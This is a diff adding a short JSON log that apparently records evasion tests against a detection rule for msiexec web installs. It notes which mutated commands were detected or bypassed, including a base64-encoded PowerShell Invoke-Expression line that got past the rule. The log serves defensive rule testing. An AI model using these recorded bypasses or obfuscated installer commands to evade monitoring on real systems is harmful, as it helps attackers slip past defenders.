@@ -1,0 +1,6 @@
+{"timestamp": "2025-06-23 10:05:30 UTC", "rule": "proc_creation_win_msiexec_web_install_0", "phase": "original", "command": "msiexec ://", "status": "DETECTED"}
+{"timestamp": "2025-06-23 10:05:46 UTC", "rule": "proc_creation_win_msiexec_web_install_0", "phase": "insertion", "command": "msiexec \":\"\"/\"\"/\"", "status": "DETECTED"}
+{"timestamp": "2025-06-23 10:05:53 UTC", "rule": "proc_creation_win_msiexec_web_install_0", "phase": "substitution", "command": "msiexec :// #substitution", "status": "BYPASSED"}
+{"timestamp": "2025-06-23 10:06:00 UTC", "rule": "proc_creation_win_msiexec_web_install_0", "phase": "omission", "command": "msiexec :// # omission", "status": "BYPASSED"}
+{"timestamp": "2025-06-23 10:06:15 UTC", "rule": "proc_creation_win_msiexec_web_install_0", "phase": "reordering", "command": "msiexec ://", "status": "DETECTED"}
+{"timestamp": "2025-06-23 10:06:24 UTC", "rule": "proc_creation_win_msiexec_web_install_0", "phase": "recoding", "command": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bXNpZXhlYyA6Ly8=')) | Invoke-Expression\" ", "status": "BYPASSED"}
